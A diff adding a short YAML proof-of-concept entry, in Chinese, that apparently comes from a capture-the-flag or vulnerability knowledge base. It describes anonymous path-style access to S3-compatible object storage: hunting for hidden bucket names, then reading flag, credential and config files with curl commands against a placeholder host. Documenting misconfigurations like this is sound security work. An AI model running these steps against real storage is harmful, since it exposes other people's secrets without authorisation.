@@ -1,0 +1,25 @@
+info:
+  name: s3_path_style_anonymous_bucket
+  cve: ''
+  summary: S3 兼容对象存储 path-style 匿名访问：列出桶/对象并读取敏感文件
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: S3 兼容对象存储 path-style 匿名访问：列出桶/对象并读取敏感文件
+  steps:
+  - 1. 识别服务为 S3 兼容 path-style 对象存储（/bucket/key）
+  - 2. 列出公开桶对象，读 README 等找内部提示（其他桶名）
+  - 3. 尝试访问提示的敏感桶（如 secret-data），确认 ACL 未加固可匿名列出
+  - 4. 列出对象找 flag.txt / credentials / config 等敏感文件并读取
+  payload: '# 列出桶对象
+
+    curl http://HOST:PORT/<bucket>/
+
+    curl "http://HOST:PORT/<bucket>/?list-type=2"
+
+    # 读取对象
+
+    curl http://HOST:PORT/<bucket>/<key>'
+  verification: S3 兼容对象存储 path-style 匿名访问：列出桶/对象并读取敏感文件
